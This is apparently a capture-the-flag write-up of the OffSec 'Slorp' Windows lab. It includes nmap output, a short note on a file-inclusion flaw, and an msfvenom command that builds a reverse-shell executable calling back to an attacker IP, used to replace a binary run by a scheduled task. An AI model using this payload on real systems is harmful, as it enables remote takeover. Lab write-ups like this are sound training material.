---
title: "Slorp"
date: 2026-04-02
draft: false
description: "OffSec Slorp writeup"
tags: ["windows", "oscp"]
categories: ["CTF Writeups"]
showTableOfContents: true
showReadingTime: true
showWordCount: true
---

# Slorp

## Overview

- **OS:** Windows
- **IP:** 192.168.117.53
- **Difficulty:** Intermediate
- **Platform:** OffSec
- **OSCP:** Yes
- **Lists:** N/A

### Summary

Initial Access with RFI and privesc with scheduled task.

## Loot

| Loot |  |
| --- | --- |
| **Category** | **Details** |
| Usernames |  |
| Passwords |  |
| Usernames+Passwords |  |
| Hashes |  |
| Service Versions |  |

## Enumeration

## Nmap

```
└─$ nmap -p- 192.168.117.53 -Pn -sCV -A  --min-rate=20000
Starting Nmap 7.95 ( https://nmap.org ) at 2026-04-02 10:15 EDT
Warning: 192.168.117.53 giving up on port because retransmission cap hit (10).
Nmap scan report for 192.168.117.53
Host is up (0.084s latency).
Not shown: 65506 closed tcp ports (reset)
PORT      STATE    SERVICE       VERSION
21/tcp    open     ftp           FileZilla ftpd 0.9.41 beta
| ftp-syst: 
|_  SYST: UNIX emulated by FileZilla
135/tcp   open     msrpc         Microsoft Windows RPC
139/tcp   open     netbios-ssn   Microsoft Windows netbios-ssn
220/tcp   filtered imap3
445/tcp   open     microsoft-ds?
3306/tcp  open     mysql         MariaDB 10.3.24 or later (unauthorized)
3921/tcp  filtered herodotus-net
4443/tcp  open     http          Apache httpd 2.4.43 ((Win64) OpenSSL/1.1.1g PHP/7.4.6)
| http-title: Welcome to XAMPP
|_Requested resource was http://192.168.117.53:4443/dashboard/
|_http-server-header: Apache/2.4.43 (Win64) OpenSSL/1.1.1g PHP/7.4.6
5040/tcp  open     unknown
7680/tcp  open     pando-pub?
7918/tcp  filtered unknown
8080/tcp  open     http          Apache httpd 2.4.43 ((Win64) OpenSSL/1.1.1g PHP/7.4.6)
|_http-open-proxy: Proxy might be redirecting requests
| http-title: Welcome to XAMPP
|_Requested resource was http://192.168.117.53:8080/dashboard/
|_http-server-header: Apache/2.4.43 (Win64) OpenSSL/1.1.1g PHP/7.4.6
21372/tcp filtered unknown
22306/tcp filtered unknown
24334/tcp filtered unknown
29118/tcp filtered unknown
30096/tcp filtered unknown
31763/tcp filtered unknown
33518/tcp filtered unknown
42544/tcp filtered unknown
43261/tcp filtered unknown
46575/tcp filtered unknown
49664/tcp open     msrpc         Microsoft Windows RPC
49665/tcp open     msrpc         Microsoft Windows RPC
49666/tcp open     msrpc         Microsoft Windows RPC
49667/tcp open     msrpc         Microsoft Windows RPC
49668/tcp open     msrpc         Microsoft Windows RPC
49669/tcp open     msrpc         Microsoft Windows RPC

```

## Dirbusting

```
shows site index.php
```

## Port 80

Web behavior was the main signal here, so I traced each response change before exploitation.

we find this

{{< figure src="image 981.png" >}}

## Exploitation

so the parameter turned out to be susceptible to lfi

{{< figure src="image 982.png" >}}

{{< figure src="image 983.png" >}}

we find this in the backup folder

{{< figure src="image 984.png" >}}

seems to be running TFTP.EXE lets replace it with our rev shell

```
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.45.177 LPORT=593 -f exe > reverse.exe 

```

now we wait

{{< figure src="image 985.png" >}}

{{< figure src="image 986.png" >}}
